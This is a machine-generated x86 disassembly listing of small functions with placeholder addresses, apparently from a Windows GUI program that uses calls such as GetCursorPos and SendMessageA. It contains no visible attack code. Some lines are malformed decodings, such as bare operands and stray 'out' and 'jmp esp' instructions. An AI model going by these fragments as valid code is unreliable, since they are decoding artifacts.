add [ ecx + 0x4 ] 0xc
retn
add [ ecx ] 0xc
retn
sub_440408
inc [ eax + 0x6c ]
retn
sub_44040c
dec [ eax + 0x6c ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
retn
xor edx edx
mov [ eax + 0x6c ] edx
call sub_441c8c
sub_44056c
call sub_440c6c
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
retn
sub_440f17
jmp sub_4039d0
sub_440f1e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440f3b
lea eax [ ebp - 0xc ]
call sub_404050
retn
sub_440f34
jmp sub_4039d0
sub_440f3b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44121c
jmp sub_4039d0
sub_441223
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441240
mov eax [ ebp - 0x4 ]
call sub_41e7fc
retn
sub_441239
jmp sub_4039d0
sub_441240
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44125d
mov eax [ ebp - 0x4 ]
call sub_403294
retn
sub_441256
jmp sub_4039d0
sub_44125d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_441711
jmp sub_4039d0
sub_441718
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4418a3
jmp sub_4039d0
sub_4418aa
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44195f
jmp sub_4039d0
sub_441966
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_441a54
jmp sub_4039d0
sub_441aa5
jmp sub_4039d0
sub_441aac
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_441b68
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_440478
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
sub_441cb4
cmp [ eax + 0x6c ] 0x0
jne r-xdata
retn
mov eax edx
call sub_43ffb4
sub_4425b4
jmp sub_4039d0
sub_4425bb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_442684
call GetCapture
retn
sub_44268c
push ebx
mov ebx edx
push ebx
call GetCursorPos
call sub_40cb9c
pop ebx
retn
sub_44269c
push ebx
mov ebx eax
push 0x13
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebx + 0xc ] al
pop ebx
retn
sub_442902
jmp sub_4039d0
sub_442afc
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push eax
call [ rw-data ]
retn
sub_442d10
jmp sub_4039d0
sub_442d17
pop ebx
mov esp ebp
pop ebp
retn
sub_442d62
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
pop ebx
retn
sub_442ddf
jmp sub_4039d0
sub_442de6
pop ebp
retn
sub_442e6e
jmp sub_4039d0
sub_442e75
pop ebp
retn
sub_442f22
out dx eax
push edx
push ecx
[ esp + esi + 0x34d80044 ]
sub_4433a0
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x30 ]
xchg edx eax
call sub_4141cc
retn
sub_4433b8
mov al 0x1
retn
sub_4433bc
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
call sub_41ad74
retn
mov eax edx
retn
sub_4433cc
cmp [ eax + 0x5c ] 0x0
je r-xdata
call sub_41ad44
retn
mov al 0x1
retn
sub_4436bc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_414170
pop esi
pop ebx
retn
sub_4436d0
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_44370c
cmp edx [ eax + 0x38 ]
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0x30 ]
sub_4438d0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403420
pop ebx
retn
sub_4438e4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403420
pop ebx
retn
sub_4438f8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403420
pop ebx
retn
sub_44390c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403420
pop ebx
retn
sub_443920
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403420
pop ebx
retn
sub_443934
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403420
pop ebx
retn
sub_443948
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403420
pop ebx
retn
sub_44395c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403420
pop ebx
retn
sub_443970
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403420
pop ebx
retn
sub_443984
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403420
pop ebx
retn
sub_443998
retn
sub_44399c
retn
sub_4439a0
retn
sub_4439a4
retn
sub_4439a8
retn
sub_4439ac
retn
sub_4439b0
retn
sub_4439b4
retn
sub_4439b8
retn
sub_4439bc
retn
sub_4439c0
retn
sub_4439c4
retn
sub_443c70
jmp sub_4039d0
sub_44400c
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebx + 0x90 ] eax
sub_444034
push esi
mov si 0xffef
call sub_403490
pop esi
retn
sub_4440d5
jmp sub_4039d0
sub_4440dc
pop ebp
retn
sub_4440e0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4139f8
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4139f8
sub_444280
mov edx eax
sub edx 0xff000000
je r-xdata
mov eax 0x20000000
sub edx 0xffffff
jne r-xdata
retn
mov eax 0x1fffffff
retn
sub_444405
jmp sub_4039d0
sub_44440c
pop ebx
pop ecx
pop ebp
retn
sub_444410
cmp [ eax + 0x3c ] 0x0
setne al
retn
sub_444418
cmp [ eax + 0x3c ] 0x0
jne r-xdata
retn
call sub_4445e8
sub_4444c5
jmp sub_4039d0
sub_4444cc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_403294
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x54 ] edx
sub_44467b
jmp sub_4039d0
sub_444682
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44471a
jmp sub_4039d0
sub_444721
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44473e
mov eax [ ebp - 0xc ]
call sub_403294
retn
sub_444737
jmp sub_4039d0
sub_44473e
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403490
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4447f7
jmp sub_4039d0
sub_4447fe
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_444804
or edx 0xffffffff
call sub_444778
retn
sub_444c13
jmp sub_4039d0
sub_444c1a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444c37
mov eax [ ebp - 0xc ]
call sub_403294
retn
sub_444c30
jmp sub_4039d0
sub_444c37
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444c54
mov eax [ ebp - 0x4 ]
call sub_44574c
retn
sub_444c4d
jmp sub_4039d0
sub_444c54
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_444e58
jmp sub_4039d0
sub_444e5f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_444e64
push esi
mov esi eax
cmp dl [ esi + 0x40 ]
je r-xdata
pop esi
retn
mov [ esi + 0x40 ] dl
mov eax esi
mov si 0xffef
call sub_403490
sub_444e7c
push ebx
mov ebx edx
mov ecx ebx
xor edx edx
xor eax eax
call sub_412ce0
pop ebx
retn
sub_444f20
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x4c ]
test ecx ecx
je r-xdata
retn
mov eax ecx
call sub_414014
sub_445037
jmp sub_4039d0
sub_44503e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403294
retn
sub_445054
jmp sub_4039d0
sub_445366
jmp sub_4039d0
sub_44536d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44538a
mov eax [ ebp - 0x10 ]
call sub_403294
retn
sub_445383
jmp sub_4039d0
sub_44538a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4453a7
mov eax [ ebp - 0x8 ]
call sub_403294
retn
sub_4453a0
jmp sub_4039d0
sub_4453a7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_445410
jmp sub_4039d0
sub_445529
jmp sub_4039d0
sub_445546
jmp sub_4039d0
sub_4456fe
jmp sub_4039d0
sub_445705
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_445748
inc [ eax + 0x5c ]
retn
sub_44574c
push esi
cmp [ eax + 0x5c ] 0x0
jle r-xdata
cmp [ eax + 0x58 ] 0x0
je r-xdata
dec [ eax + 0x5c ]
pop esi
retn
mov [ eax + 0x58 ] 0x0
mov si 0xffef
call sub_403490
sub_4457a0
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_4457dd
jmp sub_4039d0
sub_4457e4
pop ebp
retn
sub_4457e8
sub [ rw-data ] 0x1
retn
sub_446750
mov eax [ esp + 0x8 ]
retn
sub_446758
push ebx
mov ebx eax
call sub_446750
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b64c
jmp sub_403a08
sub_446774
pop ebx
retn
sub_4469ed
jmp sub_4039d0
sub_4469f4
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_446b3f
jmp sub_4039d0
sub_446b46
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_446b5c
push ebx
mov eax [ rw-data ]
call sub_4146c8
mov ebx eax
movzx edx bx
mov cl 0x1
mov eax [ rw-data ]
call sub_41469c
mov eax ebx
pop ebx
retn
sub_446ce4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403444
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_446d00
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403444
mov al [ eax + 0x95 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0xa8 ]
sete al
pop ebx
retn
sub_4473fb
jmp sub_4039d0
sub_447402
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4474fa
jmp sub_4039d0
sub_447501
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_447924
jmp sub_4039d0
sub_44792b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_447dd7
jmp sub_4039d0
sub_448278
jmp sub_4039d0
sub_44827f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4486e3
jmp sub_4039d0
sub_448ba0
jmp sub_4039d0
sub_448ba7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_448f52
jmp sub_4039d0
sub_448f59
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_448f67
inc [ ecx ]
add [ eax ] al
add [ 0xffffffffb0000000 ] ch
add ebx eax
nop
cmp dl [ eax + 0x48 ]
je r-xdata
retn
mov [ eax + 0x48 ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_449114
mov eax [ r-xdata ]
retn
sub_449150
cmp dx [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_449164
cmp dl [ eax + 0x3e ]
je r-xdata
retn
mov [ eax + 0x3e ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_449174
cmp edx [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] edx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_449184
or edx 0xffffffff
mov ecx [ eax + 0x64 ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov edx eax
mov eax ecx
call sub_449480
mov edx eax
sub_44921c
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_403444
mov edx esi
call sub_44919c
pop esi
pop ebx
retn
sub_449298
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_449480
push esi
or ecx 0xffffffff
mov esi [ eax + 0x5c ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
mov eax esi
call sub_4141cc
mov ecx eax
sub_449670
mov edx [ eax + 0x64 ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx + 0x70 ] 0x0
je r-xdata
mov eax [ edx + 0x70 ]
retn
sub_4496d8
jmp r-xdata
mov edx [ eax + 0x64 ]
test edx edx
jne r-xdata
mov eax edx
mov eax [ eax + 0x70 ]
retn
sub_449a80
cmp edx [ eax + 0x7c ]
jne r-xdata
retn
call sub_449ab4
sub_449ab4
mov edx sub_449a8c
mov ecx eax
mov eax [ eax + 0x68 ]
xchg edx eax
call sub_446bdc
retn
sub_449c9e
jmp sub_4039d0
sub_449ca5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44a13c
jmp sub_4039d0
sub_44a17b
jmp sub_4039d0
sub_44a182
mov al [ ebp - 0x1a ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44a320
cmp dl [ eax + 0x3c ]
je r-xdata
retn
mov [ eax + 0x3c ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44a45c
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ eax + 0x34 ]
mov si 0xfffd
call sub_403490
pop esi
pop ebp
retn 0x8
sub_44a478
mov eax [ eax + 0x34 ]
call sub_4476b0
retn
sub_44a484
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov si 0xfff9
call sub_403490
pop esi
retn
sub_44a4c0
push ebx
mov ecx sub_44a498
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_446bdc
pop ebx
retn
sub_44a6f4
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x48 ] 0x0
jne r-xdata
xor eax eax
retn
sub_44a708
jmp r-xdata
test edx edx
jle r-xdata
retn
test eax eax
jne r-xdata
mov eax [ eax + 0x64 ]
dec edx
sub_44a83d
jmp sub_40371c
sub_44a93f
jmp sub_4039d0
sub_44a96a
jmp sub_4039d0
sub_44a971
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_44a988
mov al [ eax + 0x41 ]
xor al 0x1
retn
sub_44ab70
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_44a4c0
sub_44abf0
jmp sub_4039d0
sub_44ac34
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_44ac4c
push ebx
mov ebx eax
mov eax ebx
call sub_41ad94
xor ecx ecx
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop ebx
retn
sub_44ac9e
add [ eax ] al
cmp edx [ eax + 0x48 ]
jne r-xdata
retn
call sub_44a4c0
sub_44ad14
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_44ae5d
jmp sub_4039d0
sub_44ae64
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44b0a4
cmp dl [ eax + 0x41 ]
je r-xdata
retn
mov [ eax + 0x41 ] dl
call sub_44b0b4
sub_44b108
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3b ]
mov al [ eax + rw-data ]
retn
sub_44b118
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3b ] dl
retn
sub_44b128
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3c ]
mov al [ eax + rw-data ]
retn
sub_44b138
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3c ] dl
retn
sub_44b148
cmp dl [ eax + 0x5c ]
je r-xdata
retn
mov [ eax + 0x5c ] dl
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
push 0x0
push 0x0
push 0xb015
push edx
call SendMessageA
sub_44b1c0
test edx edx
je r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_447508
retn
mov eax [ eax + 0x34 ]
mov edx [ edx + 0x34 ]
call sub_447508
retn
sub_44b1dc
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x34 ]
mov ecx [ ecx + 0x68 ]
cmp ecx [ edx + 0x34 ]
jne r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_447508
sub_44b224
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
call sub_44a478
retn
mov eax edx
retn
sub_44b25e
jmp sub_40371c
sub_44b263
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_456e4c
call sub_403a84
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44b5c9
jmp sub_4039d0
sub_44b5d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_403294
retn
sub_44b5e6
jmp sub_4039d0
sub_44b6e7
jmp sub_4039d0
sub_44b6ee
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b70b
mov eax [ ebp - 0x14 ]
call sub_403294
retn
sub_44b704
jmp sub_4039d0
sub_44b729
jmp sub_4039d0
sub_44b7b3
jmp sub_4039d0
sub_44b7ba
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44b7ec
push ebx
mov ebx eax
mov eax ebx
call sub_41430c
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x10 ]
call sub_41bb44
sub_44b8b0
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_44b8c4
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x54 ]
retn
sub_44b8cc
mov eax [ eax + 0x34 ]
mov [ eax + 0x54 ] edx
retn
sub_44bc91
jmp sub_4039d0
sub_44bc98
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44bd98
jmp sub_4039d0
sub_44bd9f
pop ebp
retn
sub_44c92f
[ edi + edi * 8 - 0x2f002f ]
sub_44c936
stc
jmp esp
sub_44dbf8
mov eax [ rw-data ]
retn
sub_44dc00
mov [ rw-data ] eax
retn
sub_44dd48
jmp sub_40371c
sub_44dd7f
jmp sub_4039d0
sub_44dd86
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44df54
call sub_41ba6c
retn
sub_44e096
jmp sub_4039d0
sub_44e09d
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44e141
jmp sub_4039d0
sub_44e148
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44e1d8
mov al [ eax + 0x1f ]
xor al 0x1
retn
sub_44e904
cmp edx [ eax + 0x28 ]
je r-xdata
retn
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_44efb0
sub_44e920
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
test dl dl
je r-xdata
mov edx 0xff000014
call sub_44e904
sub_44ea40
cmp dl [ eax + 0x34 ]
je r-xdata
retn
mov [ eax + 0x34 ] dl
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_44efb0
sub_44ea58
cmp edx [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] edx
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_44efb0
sub_44ea70
mov ecx edx
mov [ eax + 0x10 ] ecx
test ecx ecx
jge r-xdata
mov eax [ eax + 0x4 ]
call sub_44efb0
retn
xor edx edx
mov [ eax + 0x10 ] edx
sub_44ea9c
mov eax [ eax + 0x4 ]
mov al [ eax + 0x210 ]
xor al 0x1
retn
sub_44eaa8
mov [ eax + 0x1c ] dl
mov eax [ eax + 0x4 ]
call sub_44efb0
retn
sub_44ed88
push ebx
mov ebx edx
mov edx ebx
call sub_43adf8
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_44edf8
cmp [ eax + 0x5c ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
sub_44ef20
jmp sub_4039d0
sub_44ef27
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44ef30
push ebx
mov ebx eax
cmp [ ebx + 0x214 ] 0x0
jg r-xdata
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_44e33c
mov eax [ ebx + 0x20c ]
call sub_44e33c
sub_44ef90
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_44efa0
push esi
mov esi eax
mov eax [ esi + 0x20c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_44f09b
jmp sub_4039d0
sub_44f0a8
test edx edx
je r-xdata
retn
test [ edx + 0x1c ] 0x1
jne r-xdata
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_44f0c0
sub_44f2dc
retn
sub_44f34a
jmp sub_4039d0
sub_44f389
jmp sub_4039d0
sub_44f3bc
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_43c2f0
retn
mov ecx [ eax + 0x208 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x208 ]
call sub_44e5c8
retn
sub_44f3e0
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_43c310
retn
mov ecx [ eax + 0x20c ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x20c ]
call sub_44e5c8
retn
sub_44f4d5
jmp sub_4039d0
sub_44f4dc
mov eax [ ebp - 0x4 ]
call sub_43e270
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_44e230
mov eax [ ebp - 0x4 ]
call sub_44efb0
sub_44f610
jmp sub_4039d0
sub_44f648
jmp sub_4039d0
sub_44f64f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f66f
lea eax [ ebp - 0x114 ]
call sub_404050
retn
sub_44f668
jmp sub_4039d0
sub_44f66f
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_44f976
jmp sub_4039d0
sub_44f97d
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4035f0
sub_44f9d1
jmp sub_40371c
sub_44fa4d
jmp sub_40371c
sub_44fa52
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_456e4c
call sub_403a84
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44fe0a
jmp sub_4039d0
sub_44fe11
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44feec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41876c
mov [ ebx + 0x270 ] eax
pop esi
pop ebx
retn
sub_44ff04
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44ff3c
mov edx eax
mov eax esi
call sub_419ff4
pop esi
pop ebx
retn
sub_44ff20
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4512e0
mov edx eax
mov eax esi
call sub_419ff4
pop esi
pop ebx
retn
sub_44ff3c
push ebx
mov ebx eax
mov eax ebx
call sub_450f80
mov edx r-xdata
call sub_41e780
pop ebx
retn
sub_450040
push ebx
mov ebx eax
mov eax ebx
call sub_450050
xor al 0x1
pop ebx
retn
sub_450050
cmp [ eax + 0x210 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x208 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0x20c ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
sub_4500ac
push ebx
cmp [ eax + 0x292 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x294 ]
call [ ebx + 0x290 ]
sub_4500cc
push ebx
cmp [ eax + 0x2b2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_4500ec
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_4503e5
jmp sub_4039d0
sub_4503ec
pop ecx
pop ebp
retn
sub_4503f0
xor eax eax
retn
sub_4506c8
jmp sub_4039d0
sub_4506cf
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403294
retn
sub_4506e5
jmp sub_4039d0
sub_4507cf
jmp sub_4039d0
sub_4507d6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4507f3
mov eax [ ebp - 0xc ]
call sub_403294
retn
sub_4507ec
jmp sub_4039d0
sub_450813
jmp sub_4039d0
sub_450afe
jmp sub_4039d0
sub_450c91
jmp sub_4039d0
sub_450f80
mov eax [ eax + 0x238 ]
retn
sub_450f88
mov eax [ eax + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_450f94
mov al [ eax + 0x5e ]
xor al 0x1
retn
sub_4512d2
jmp sub_4039d0
sub_4512d9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4512e0
mov eax [ eax + 0x25c ]
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
sub_451328
cmp dl [ eax + 0x230 ]
je r-xdata
retn
mov [ eax + 0x230 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_43b50c
sub_451344
cmp [ eax + 0x25c ] 0x0
setne al
retn
sub_451380
push ebx
mov ebx eax
mov eax ebx
call sub_43d4a0
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_41e184
sub_451404
push ebx
mov ebx eax
mov eax ebx
call sub_43d4c8
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_41e824
sub_451424
push ebx
mov ebx eax
mov eax ebx
call sub_451044
mov edx [ ebx + 0x248 ]
mov eax ebx
call sub_45110c
pop ebx
retn
sub_451c51
lea eax [ ebp - 0xb4 ]
call sub_404050
retn
sub_451c5d
jmp sub_4039d0
j_sub_451c51
jmp sub_451c51
sub_451c64
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_451dbc
jmp sub_4039d0
sub_451dc3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4520a8
jmp sub_4039d0
sub_4520af
mov eax [ rw-data ]
call sub_454960
mov bl 0x1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4520c6
add [ eax ] al
retn
sub_452324
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_452344
mov eax [ eax + 0x240 ]
call sub_4229c8
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
call sub_456700
sub_4523eb
jmp sub_4039d0
sub_4523f2
xor eax eax
pop edx
pop ecx
pop ecx
